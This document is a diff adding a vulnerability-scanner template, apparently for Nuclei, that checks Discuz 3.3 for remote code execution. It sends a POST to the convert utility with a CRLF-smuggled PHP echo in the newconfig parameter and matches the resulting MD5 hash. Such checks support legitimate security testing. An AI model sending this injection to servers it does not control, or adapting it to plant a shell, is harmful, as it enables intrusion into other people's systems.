@@ -1,0 +1,42 @@
+id: discuz-3-3-rce-getshell
+info:
+  name: Discuz 3.3 RCE Getshell
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An attacker can execute PHP code at will and gain server permissions.
+  reference:
+    - https://blog.csdn.net/weixin_43221560/article/details/93094937
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test"
+        part: body
+  - raw:
+      - |
+        POST /utility/convert/index.php?a=config&source=d7.2_x2.0&newconfig[aaa%0a%0decho(md5(88));//]=aaaa&submit=yes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "2a38a4a9316c49e5a833517c45d31070"
+        part: body
+    stop-at-first-match: true
